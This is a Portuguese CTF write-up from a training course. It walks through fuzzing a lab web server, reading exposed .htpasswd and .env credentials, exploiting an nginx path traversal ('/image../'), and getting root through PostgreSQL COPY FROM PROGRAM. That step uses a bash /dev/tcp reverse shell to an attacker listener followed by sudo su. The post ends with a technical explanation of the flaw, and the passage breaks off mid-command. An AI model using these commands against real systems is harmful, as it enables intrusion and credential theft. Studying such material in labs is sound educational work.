---
title: "CTF: De um Path Traversal ao acesso root"
date: 2025-07-17T13:50:00-03:00
draft: false
description: "Descubra como vulnerabilidades de Path Traversal funcionam, desde sua origem até o root, com testes práticos com Docker. Um guia direto com teoria, análise de código e exploração real."
noindex: false
featured: false
pinned: false
comments: true
series:
 - 
categories:
 - Windows
 - Segurança e Defesa
 - Ataques e Exploração
 - Resposta a Incidentes
tags:
 - Resposta a Incidentes
 - Análise de Logs
 - Registros
 - Threat Hunting
 - Detecção de Ameaças
 - Exploração
 - Logs do Windows
 - Scripts
 - PowerShell
authors:
 - sandson
#images:
---
# DISCLAIMER

No momento da construção desse artigo, não possuo habilidades técnicas avançadas em Pentest Web, portanto, é provável que algum conceito ou técnica seja erroneamente aplicada/explicada. Este desafio fez parte de um curso que eu fiz (Curso de Resposta a Incidentes da RSquad Academy) que era requisito para a conclusão do curso. Durante a resolução do desafio, apliquei meus conhecimentos existentes complementados por pesquisas adicionais. Se você tem conhecimento avançado e encontrou algum erro, por favor, entre em contato comigo para explicar melhor e aplicar a devida correção.

# 1. Introdução

O presente artigo faz referência a um desafio de Capture The Flag (CTF) na qual o objetivo era identificar e explorar uma vulnerabilidade de `Path Traversal`. A proposta do desafio envolvia analisar o comportamento de uma aplicação web e, por meio da vulnerabilidade, obter acesso ao servidor e encontrar as flags necessárias.

Path Traversal (também conhecido como Directory Traversal) é uma vulnerabilidade que ocorre quando uma aplicação web não valida adequadamente os caminhos de arquivos fornecidos pelo usuário. Isso permite que um atacante acesse diretórios e arquivos fora da raiz da aplicação web usando sequências como `../` para navegar para diretórios superiores na estrutura de arquivos do servidor.

O impacto desta vulnerabilidade pode variar desde a simples leitura de arquivos locais sensíveis até a execução de códigos arbitrários, dependendo do cenário e das permissões do usuário da aplicação no sistema operacional.

Ao longo deste artigo, veremos:

- Uma explicação teórica e prática sobre `Path Traversal`.
- A diferença técnica entre diretórios `/image/../` e `/image../` e como isso influencia o comportamento do servidor.
- Como identificar essa vulnerabilidade durante a análise de uma aplicação.
- Como simular o ambiente de exploração usando Docker.
- Análise detalhada das falhas encontradas e suas mitigações.
- Escalação de privilégios através do PostgreSQL.

Se você está buscando aprender sobre `Path Traversal` com exemplos reais, análise técnica e uma simulação completa em laboratório local, este artigo é para você.

{{< bs/alert info >}}
{{< bs/alert-heading "Desafios da BOX:" >}}
<strong>Desafio 1:</strong> Informe a flag que começa com Extreme{e<br>
<strong>Desafio 2:</strong> Informe o nome da falha OWASP no formato AXX:YYYY - .* (em inglês)<br>
<strong>Desafio 3:</strong> Informe a flag que começa com Extreme{d<br>
<strong>Desafio 4:</strong> Informe a flag que começa com Extreme{5<br>
<strong>Desafio 5:</strong> Informe o conteúdo do arquivo proof.txt
{{< /bs/alert >}}

# 2. Fase Prática - Resolução do CTF

## 2.1. Reconhecimento

Ao acessar o IP do desafio `http://10.0.1.103/`, somos redirecionados automaticamente para `http://10.0.1.103/tshirt/`, onde encontramos a seguinte página:

<figure style="text-align: center;">
  <img src="tshirt.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: 500px;">
</figure>

**Observação:** O código-fonte mostrou que as imagens eram carregadas de um diretório chamado `/image/`. Além disso, um link comentado para `/login/` sugeria a existência de uma área restrita.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Xtr T-Shirts</title>
    <style>
.carousel {
    width: 100%;
    height: 800px;
    position: relative;
    overflow: hidden;
}

.carousel-image {
    display: none;
    position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
    width: 1024px;
  height: 800px;
  object-fit: contain;
}

a {
    text-decoration: none;
    color: blue;
}

 </style>
</head>
<body>
    <h1 style="text-align: center;">T-Shirts Xtr</h1>
<div class="carousel">
    <img class="carousel-image" src="/image/1.jpg">
    <img class="carousel-image" src="/image/2.jpg">
    <img class="carousel-image" src="/image/3.jpg">
    <img class="carousel-image" src="/image/4.jpg">
</div>

<br><br><br>
<!-- <a href="/login/">Login</a> -->
<br>
<script >
const carouselImages = document.querySelectorAll('.carousel-image');
let currentIndex = 0;

function showImage(index) {
    carouselImages.forEach((image, i) => {
        if (i === index) {
            image.style.display = 'block';
        } else {
            image.style.display = 'none';
        }
    });
}

function nextImage() {
    currentIndex++;
    if (currentIndex >= carouselImages.length) {
        currentIndex = 0;
    }
    showImage(currentIndex);
}

function previousImage() {
    currentIndex--;
    if (currentIndex < 0) {
        currentIndex = carouselImages.length - 1;
    }
    showImage(currentIndex);
}

document.addEventListener('DOMContentLoaded', () => {
    showImage(currentIndex);
    setInterval(nextImage, 5000);
});
</script>
</body>
</html>
```

## 2.2. Tentativa de login

Acessando o diretório `/login/`, ele solicitava usuário e senha. Tentamos bruteforce com `rockyou.txt`, credenciais padrões e SQLi, mas sem sucesso.

<figure style="text-align: center;">
  <img src="login.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: 500px;">
</figure>

## 2.3. Diretório acessível: `/image/`

Deixando de lado o acesso ao login temporariamente, continuei analisando o código-fonte e descobri que o diretório `/image/` permitia listagem de arquivos (Directory Listing), o famoso `Index of`:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /Chibi</title>
 </head>
 <body>
<h1>Index of /Chibi</h1>
<ul><li><a href="/"> Parent Directory</a></li>
<li><a href="1.jpg"> 1.jpg</a></li>
<li><a href="2.jpg"> 2.jpg</a></li>
<li><a href="3.jpg"> 3.jpg</a></li>
<li><a href="4.jpg"> 4.jpg</a></li>
</ul>
</body></html>
```

**Observação importante:** O título mostra `Index of /Chibi`, revelando que internamente o servidor está servindo conteúdo de um diretório chamado "Chibi". Esta informação entre o caminho externo `/image/` e o interno `/Chibi` indica uma configuração de proxy reverso ou mapeamento de diretórios.

## 2.4. Identificando a falha OWASP

Inicialmente eu ignorei a descoberta de alguma possível falha, e foquei no enunciado do **Desafio 2**, pois estava mais fácil. A dica no enunciado pedia o nome da falha. Cruzando com as categorias da OWASP Top 10 2021, foi fácil obter a resposta.

Com isso, identificamos a resposta do **Desafio 2:** `A05:2021 - Security Misconfiguration`

## 2.5. Enumeração inicial e descoberta do Path Traversal

Suspeitando de uma vulnerabilidade de Path Traversal devido ao Directory Listing e ao mapeamento `/image/` para `/Chibi`, executei um fuzzing no diretório raiz.

```bash {linenos=inline,hl_lines=[27,33]}
ffuf -u "http://10.0.1.103/FUZZ" \
     -w /usr/share/wordlists/seclists/Fuzzing/fuzz-Bo0oM.txt \
     -fc 301


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.1.103/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/fuzz-Bo0oM.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

.htpasswd               [Status: 200, Size: 36, Words: 1, Lines: 2, Duration: 81ms]
login/                  [Status: 401, Size: 195, Words: 6, Lines: 8, Duration: 79ms]
login/admin/admin.asp   [Status: 401, Size: 195, Words: 6, Lines: 8, Duration: 79ms]
login/index             [Status: 401, Size: 195, Words: 6, Lines: 8, Duration: 80ms]
login/login             [Status: 401, Size: 195, Words: 6, Lines: 8, Duration: 82ms]
login/super             [Status: 401, Size: 195, Words: 6, Lines: 8, Duration: 81ms]
nginx.conf              [Status: 200, Size: 643, Words: 148, Lines: 33, Duration: 79ms]
:: Progress: [4842/4842] :: Job [1/1] :: 490 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

## 2.6. Análise dos arquivos descobertos

Pelo fuzzing identificamos 2 documentos, o `.htpasswd` e o `nginx.conf`. 

Verificando os dois arquivos temos:

{{< bs/toggle name=underline style=underline fill=false alignment=left >}}
  {{< bs/toggle-item ".htpasswd" >}}
  {{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.164/.htpasswd
extremer:{PLAIN}AtWorkAreUnbeatable
    {{< /highlight >}}{{< /bs/toggle-item >}}
  {{< bs/toggle-item nginx.conf >}} {{< highlight bash >}}
# Configuração default do nginx.conf
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.164/nginx.conf

user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;


events {
    worker_connections  1024;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    keepalive_timeout  65;

    #gzip  on;

    include /etc/nginx/conf.d/*.conf;
}
{{< /highlight >}}
  {{< /bs/toggle-item >}}
{{< /bs/toggle >}}

O arquivo `.htpasswd` continha credenciais em texto claro e o `nginx.conf` apenas mostrou que a configuração default do servidor pode ser acessada diretamente da raiz.

## 2.7. Novas descobertas

Entendendo que o `nginx.conf` estava exposto e que esse arquivo se trata do arquivo de configuração padrão do servidor, fui enumerar o diretório interno `conf.d/` para ver se encontrava alguma outra informação extra:

{{< bs/toggle name=extra style=underline fill=false alignment=left >}}
  {{< bs/toggle-item "conf.d/" >}}
  {{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://10.0.2.107/conf.d/FUZZ" \     
     -w /usr/share/wordlists/dirb/common.txt -fc 301 -e .conf

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.107/conf.d/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .conf 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

default.conf            [Status: 200, Size: 492, Words: 152, Lines: 27, Duration: 80ms]
:: Progress: [9228/9228] :: Job [1/1] :: 495 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
    {{< /highlight >}}{{< /bs/toggle-item >}}
  {{< bs/toggle-item "default.conf" >}} {{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.107/conf.d/default.conf
server {
    listen 80;
    server_name ~^(.+)$;
    root /etc/nginx;

    location / {
        if (!-f $request_filename) {
            return 301 /tshirt;
        }
        
    }

    location /tshirt {
        alias /usr/share/nginx/html/;
    }
    
    location /image {
        proxy_pass http://apache:80/Chibi/;
    }
    

    location /login/ {
        auth_basic "Authetication Required";
        auth_basic_user_file /etc/nginx/.htpasswd;
        alias /usr/share/login/;
    }
}
{{< /highlight >}}
  {{< /bs/toggle-item >}}
{{< /bs/toggle >}}

## 2.8. Sucesso no login e primeira flag

Então, agora podemos realizar o login usando as credenciais que encontramos e ver o que recebemos:

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://extremer:AtWorkAreUnbeatable@10.0.1.33/login/   
<!DOCTYPE html>
<html>
<head>
    <title>User Logged In</title>
</head>
<body>
    <h1>Welcome, Extremer!</h1>
    <p>You are logged in.</p>
    <h6>Extreme{e4d10d670d0aab07659deec1942d502a}</h6>
    <p>There are more three flags: local.txt,.env and proof.txt</p>
</body>
</html>
```

Com isso, identificamos a resposta do **Desafio 1**: `Extreme{e4d10d670d0aab07659deec1942d502a}`, e ao logar, indica que precisamos encontrar mais 3 flags `local.txt`, `.env` e `proof.txt`.

## 2.9. Explorando Path Traversal

Voltando ao fuzzing e entendendo que se trata de um `path traversal`, eu tento o que é comum em testes desse tipo no diretório `/image/`.

Tentei vários métodos...

```bash
http://10.0.2.164/image/../
http://10.0.2.164/image/../../
http://10.0.2.164/image/../../../
http://10.0.2.164/image/../../../../
http://10.0.2.164/image/../../../../../
http://10.0.2.164/image/../../../../../../
http://10.0.2.164/image/../../../../../../../
http://10.0.2.164/image/../../../../../../../../
http://10.0.2.164/image/../../../../../../../../../
```
E nada funcionava... Daí eu tentei o seguinte e funcionou!

```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.1.227/image../"                
<html><body><h1>It works!</h1></body></html>
```

Perceba que eu não consegui com o convencional `/image/../` mas foi `/image../`. Eu particularmente nunca tinha visto isso assim, foi a primeira vez.

De posse dessa informação, foi só rodar um fuzzing novamente e encontramos a próxima flag.

{{< bs/toggle name=jsjsjs style=pills fill=false alignment=left >}}
{{< bs/toggle-item Fuzzing >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://10.0.1.227/image../FUZZ" \
     -w /usr/share/wordlists/seclists/Fuzzing/fuzz-Bo0oM.txt \
     -fc 301 -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.1.227/image../FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/fuzz-Bo0oM.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

%2e%2e//google.com      [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 83ms]
.env                    [Status: 200, Size: 180, Words: 1, Lines: 11, Duration: 80ms]
cgi-bin/test-cgi        [Status: 200, Size: 1261, Words: 150, Lines: 43, Duration: 80ms]
index.html              [Status: 200, Size: 45, Words: 2, Lines: 2, Duration: 81ms]
:: Progress: [4842/4842] :: Job [1/1] :: 503 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
{{< /highlight >}}
{{< /bs/toggle-item >}}

{{< bs/toggle-item "Lendo o arquivo .env" >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.1.227/image../.env"
DB_PASSWORD=DontBrotherMe_CrackMeIfYouCan
DB_USER=postgres
DB_NAME=tshirts
DB_HOST=db


SERVER_PORT=8080
SERVER_TIMEOUT=300

FLAG=Extreme{55cb4f883997143ea5946f10c5484295ce93a7b3}
{{< /highlight >}}
  {{< /bs/toggle-item >}}
{{< /bs/toggle >}}

Com isso, identificamos a resposta do **Desafio 4**: `Extreme{55cb4f883997143ea5946f10c5484295ce93a7b3}`.

## 2.10. Continuando a busca por `local.txt`

Tentei um fuzzing procurando por `.txt` no `/image` e não encontrei o arquivo `local.txt`. Rodei o fuzzing no diretório `/tshirt/` pra ver se encontrava alguma coisa `.txt` e também não encontrei.

Eu testei a lista `/usr/share/wordlists/seclists/Fuzzing/fuzz-Bo0oM.txt` tanto no diretório `/image` quanto `/tshirt` e como não encontrei nada, testei a lista padrão `/usr/share/wordlists/dirb/common.txt`.

{{< bs/toggle name=123 style=pills fill=false alignment=left >}}
{{< bs/toggle-item Fuzzing >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://10.0.1.227/tshirt../FUZZ" \
     -w /usr/share/wordlists/dirb/common.txt \
     -e .txt -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.1.227/tshirt../FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

                        [Status: 403, Size: 169, Words: 4, Lines: 8, Duration: 81ms]
local.txt               [Status: 200, Size: 41, Words: 1, Lines: 1, Duration: 81ms]
:: Progress: [9228/9228] :: Job [1/1] :: 496 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
{{< /highlight >}}
{{< /bs/toggle-item >}}

{{< bs/toggle-item "local.txt" >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.1.227/tshirt../local.txt"
Extreme{dea108580947e9d18e4f4129550b669c}
{{< /highlight >}}
  {{< /bs/toggle-item >}}
{{< /bs/toggle >}}

Com essa wordlist conseguimos encontrar o arquivo. Com isso, identificamos a resposta do **Desafio 3**: `Extreme{dea108580947e9d18e4f4129550b669c}`.

## 2.11. Escalação de privilégios e última flag

Agora, falta a última flag, que é a `proof.txt`. Eu pensei em algumas possibilidades dessa flag estar em algum lugar no banco, já que encontramos o login.

De posse do acesso ao banco, tentei explorar fazendo algumas consultas, mas não encontrei nada...

```bash
┌──(kali㉿kali)-[~]
└─$ psql -h 10.0.0.213 -U postgres -d tshirts

Password for user postgres: 
psql (17.5 (Debian 17.5-1), server 14.8 (Debian 14.8-1.pgdg120+1))
Type "help" for help.

tshirts=# \dt
Did not find any relations.
tshirts=# SELECT * FROM users;
ERROR:  relation "users" does not exist
LINE 1: SELECT * FROM users;
                      ^
tshirts=# \dn
  List of schemas
  Name  |  Owner   
--------+----------
 public | postgres
(1 row)

tshirts=# SELECT schemaname, tablename
FROM pg_tables
WHERE schemaname NOT IN ('pg_catalog', 'information_schema');
 schemaname | tablename 
------------+-----------
(0 rows)

tshirts=# SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE column_name ILIKE '%flag%'
   OR column_name ILIKE '%user%'
   OR column_name ILIKE '%pass%';
    table_schema    |           table_name            |        column_name         
--------------------+---------------------------------+----------------------------
 information_schema | _pg_user_mappings               | umuser
 pg_catalog         | pg_user_mapping                 | umuser
 pg_catalog         | pg_roles                        | rolbypassrls
 pg_catalog         | pg_shadow                       | userepl
 pg_catalog         | pg_shadow                       | usebypassrls
 pg_catalog         | pg_user                         | userepl
 pg_catalog         | pg_user                         | usebypassrls
 pg_catalog         | pg_available_extension_versions | superuser
 pg_catalog         | pg_user_mappings                | umuser
 pg_catalog         | pg_authid                       | rolbypassrls
 pg_catalog         | pg_user                         | passwd
 pg_catalog         | pg_hba_file_rules               | user_name
 pg_catalog         | pg_roles                        | rolpassword
 information_schema | user_defined_types              | user_defined_type_category
 pg_catalog         | pg_authid                       | rolpassword
 information_schema | routines                        | is_user_defined_cast
 information_schema | user_defined_types              | user_defined_type_schema
 information_schema | tables                          | user_defined_type_catalog
 information_schema | tables                          | user_defined_type_schema
 information_schema | tables                          | user_defined_type_name
 pg_catalog         | pg_shadow                       | passwd
 information_schema | user_defined_types              | user_defined_type_name
 information_schema | user_defined_types              | user_defined_type_catalog
(23 rows)

tshirts=# SELECT proname
FROM pg_proc
WHERE pronamespace NOT IN (
    SELECT oid FROM pg_namespace
    WHERE nspname LIKE 'pg_%' OR nspname = 'information_schema'
);
 proname 
---------
(0 rows)

tshirts=# \ds
Did not find any relations.

tshirts=#
```

Eu não vi nada de nada aí nesse banco... aí, meu amigo, meus conhecimentos estavam totalmente limitados com zero! possibilidades de ideias do que fazer... Foi então que, depois de muito tempo, eu pensei numa possibilidade. Eu lembrei que podíamos escalar um shell a partir do banco... e então fui pra internet pesquisar como escalar do banco de dados para um shell, encontrar alguma forma de conseguir isso... Pois num é que eu consegui!

Com a senha em mãos eu acessei o banco, fiz o que tinha que fazer, consegui o shell e parti para o abraço! 🙅🏾‍♂️

{{< bs/toggle name=shell style=pills fill=false alignment=left >}}
{{< bs/toggle-item "Acesso ao banco" >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ psql -h 10.0.0.213 -U postgres -d tshirts
Password for user postgres: 
psql (17.5 (Debian 17.5-1), server 14.8 (Debian 14.8-1.pgdg120+1))
Type "help" for help.

tshirts=# CREATE TABLE shell_out(cmd_output text);
CREATE TABLE
tshirts=# COPY shell_out FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.1.0.154/4444 0>&1"';

{{< /highlight >}}
{{< /bs/toggle-item >}}

{{< bs/toggle-item "Shell conectadoooo!!! 😎" >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.1.0.154] from (UNKNOWN) [10.0.0.213] 47364
bash: cannot set terminal process group (112): Inappropriate ioctl for device
bash: no job control in this shell
postgres@ccebedecc39d:~/data$ id 
id
uid=999(postgres) gid=999(postgres) groups=999(postgres),27(sudo),101(ssl-cert)
postgres@ccebedecc39d:~/data$ sudo su
sudo su
ls /root/
proof.txt
cat proof.txt
cat: proof.txt: No such file or directory
cat /root/proof.txt
Extreme{c4b59fd60e36bb9026a2455021325e1684e83b7e}
{{< /highlight >}}
  {{< /bs/toggle-item >}}
{{< /bs/toggle >}}

E com isso, finalmente identificamos a resposta da nossa última flag! **Desafio 5**: `Extreme{c4b59fd60e36bb9026a2455021325e1684e83b7e}`.

## 2.12. Exploit público

Depois de já ter concluído o CTF com esse método de shell por dentro do banco de dados, foi que eu pensei em procurar algum exploit público. Depois de já ter feito eu encontrei um exploit público para uma <kbd>CVE-2019-9193</kbd>. O link para o exploit está nas referências.

# 3. Análise técnica das falhas, explorações e mitigações

## 3.1. O que é Path Traversal?

Path Traversal, também conhecido como Directory Traversal, é uma vulnerabilidade que permite ao atacante acessar arquivos ou diretórios fora do diretório raiz da aplicação web. Ela explora a manipulação de caminhos como `../` para voltar níveis na árvore de diretórios.

**Exemplo:**

* `/view/../../../etc/passwd`
* `/download.php?file=../../../home/user/secret.txt`

## 3.2. Por que `/image/../` não funcionou, mas `/image../` sim?

O comportamento se deve à forma como o **Nginx** trata as diretivas de `location` e como o `proxy_pass` é interpretado. Ver a seção 2.7.

Quando você acessa `/image/`, essa requisição é repassada para `http://apache:80/Chibi/` e o restante do path após o `/image` é incluso após o `/Chibi/`, como no caso das imagens.

### 3.2.1. Porque `/image/../` não funcionou?

**O que o Nginx faz?**

Quando você acessa `/image/../`, o Nginx normaliza o path, ou seja, ele entende o `/image/../` como `/`, porque o `..` significa "voltar um diretório". Então, a requisição está indo para `/` e não mais para `/image`.

**O que acontece?**

O Nginx não encontra uma `location /image`, pois o path já foi normalizado como `/`, então ele usa `location /`. Como o bloco `location /` não tem `proxy_pass`, o Nginx mesmo responde como `HTTP 301 (Redirect)` para `/tshirt` (ver o arquivo de `default.conf`na seção 2.7). Como resultado, o `/image/../` é interceptado e redirecionado pelo próprio Nginx, sem chegar no servidor interno que nesse caso é o Apache.

Basicamente o servidor internamente está interpretando assim:

- Se `/image/` então internamente vai ser `http://apache:80/Chibi/`. Aqui é listado o diretório `Index of`.
- Se `/image/1.jpg` então internamente vai ser `http://apache:80/Chibi/1.jpg`.
- Se `/image/../` então internamente vai ser `http://apache:80`. Pois ele tá voltando um diretório e como nesse caso ele tem um `location /`, ele faz o redirecionamento para `/tshirt`.

**Veja o header da requisição:**

```bash {linenos=inline,hl_lines=[6]}
┌──(kali㉿kali)-[~]
└─$ curl -v http://10.0.2.107/image/../
*   Trying 10.0.2.107:80...
* Connected to 10.0.2.107 (10.0.2.107) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.0.2.107
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.13.0
< Date: Fri, 18 Jul 2025 17:43:54 GMT
< Content-Type: text/html
< Content-Length: 185
< Location: http://10.0.2.107/tshirt
< Connection: keep-alive
< 
<html>
<head><title>301 Moved Permanently</title></head>
<body bgcolor="white">
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.13.0</center>
</body>
</html>
* Connection #0 to host 10.0.2.107 left intact
```

### 3.2.2. Porque `/image../` funcionou?

**O que o Nginx faz?**

Quando você acessa `/image../`, o Nginx não interpreta isso como um diretório real e não realiza nenhuma normalização de path como ocorre no `/image/../`. O `/image../` é considerado um nome literal de URI, onde o `..` não está separado por `/` como parte de um caminho de diretório, portanto não aciona o mecanismo de normalização do Nginx. O Nginx ainda faz match com a diretiva `location /image`, pois `/image../` começa com `/image`. Isso é diferente do que foi explicado anteriormente, não há falha no matching, mas sim um matching bem-sucedido.

**O que acontece?**

Como o Nginx identifica que `/image../` faz match com `location /image`, ele aplica o `proxy_pass` configurado:

```nginx
location /image {
    proxy_pass http://apache:80/Chibi/;
}
```

O Nginx encaminha a requisição para `http://apache:80/Chibi/` e anexa o restante do path após `/image`, que no caso é `..`. Então a requisição que chega ao Apache é para `/Chibi/..`.

**O que o Apache faz?**

O Apache, ao receber a requisição para `/Chibi/..`, normaliza esse path. Como `..` significa "voltar um diretório", o Apache interpreta `/Chibi/..` como `/`.

Por isso, quando executamos `curl http://10.0.2.107/image../`, vemos a resposta `<html><body><h1>It works!</h1></body></html>`, que é a página padrão do Apache para a raiz do site.

**Veja o header da requisição:**

```bash
┌──(kali㉿kali)-[~]
└─$ curl -v http://10.0.2.107/image../
*   Trying 10.0.2.107:80...
* Connected to 10.0.2.107 (10.0.2.107) port 80
* using HTTP/1.x
> GET /image../ HTTP/1.1
> Host: 10.0.2.107
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.13.0
< Date: Fri, 18 Jul 2025 17:42:59 GMT
< Content-Type: text/html
< Content-Length: 45
< Connection: keep-alive
< Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
< ETag: "2d-432a5e4a73a80"
< Accept-Ranges: bytes
< 
<html><body><h1>It works!</h1></body></html>
* Connection #0 to host 10.0.2.107 left intact
```

**Por que isso funcionou?**

O comportamento pode ser confirmado testando outros caminhos similares:

{{< bs/toggle name=apache style=pills fill=false alignment=left >}}
{{< bs/toggle-item "test.." >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ curl -v http://10.0.2.107/test../
*   Trying 10.0.2.107:80...
* Connected to 10.0.2.107 (10.0.2.107) port 80
* using HTTP/1.x
> GET /test../ HTTP/1.1
> Host: 10.0.2.107
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.13.0
< Date: Fri, 18 Jul 2025 18:23:55 GMT
< Content-Type: text/html
< Content-Length: 185
< Location: http://10.0.2.107/tshirt
< Connection: keep-alive
< 
<html>
<head><title>301 Moved Permanently</title></head>
<body bgcolor="white">
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.13.0</center>
</body>
</html>
* Connection #0 to host 10.0.2.107 left intact
{{< /highlight >}}
{{< /bs/toggle-item >}}

{{< bs/toggle-item "qualquer-coisa.." >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ curl -v http://10.0.2.107/qualquer-coisa../
*   Trying 10.0.2.107:80...
* Connected to 10.0.2.107 (10.0.2.107) port 80
* using HTTP/1.x
> GET /qualquer-coisa../ HTTP/1.1
> Host: 10.0.2.107
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.13.0
< Date: Fri, 18 Jul 2025 18:26:12 GMT
< Content-Type: text/html
< Content-Length: 185
< Location: http://10.0.2.107/tshirt
< Connection: keep-alive
< 
<html>
<head><title>301 Moved Permanently</title></head>
<body bgcolor="white">
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.13.0</center>
</body>
</html>
* Connection #0 to host 10.0.2.107 left intact
{{< /highlight >}}
{{< /bs/toggle-item >}}


{{< bs/toggle-item "image." >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ curl -v http://10.0.2.107/image./
*   Trying 10.0.2.107:80...
* Connected to 10.0.2.107 (10.0.2.107) port 80
* using HTTP/1.x
> GET /image./ HTTP/1.1
> Host: 10.0.2.107
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.13.0
< Date: Fri, 18 Jul 2025 18:26:36 GMT
< Content-Type: text/html;charset=ISO-8859-1
< Content-Length: 358
< Connection: keep-alive
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /Chibi</title>
 </head>
 <body>
<h1>Index of /Chibi</h1>
<ul><li><a href="/"> Parent Directory</a></li>
<li><a href="1.jpg"> 1.jpg</a></li>
<li><a href="2.jpg"> 2.jpg</a></li>
<li><a href="3.jpg"> 3.jpg</a></li>
<li><a href="4.jpg"> 4.jpg</a></li>
</ul>
</body></html>
* Connection #0 to host 10.0.2.107 left intact
{{< /highlight >}}
{{< /bs/toggle-item >}}


{{< bs/toggle-item "image__" >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ curl -v http://10.0.2.107/image__
*   Trying 10.0.2.107:80...
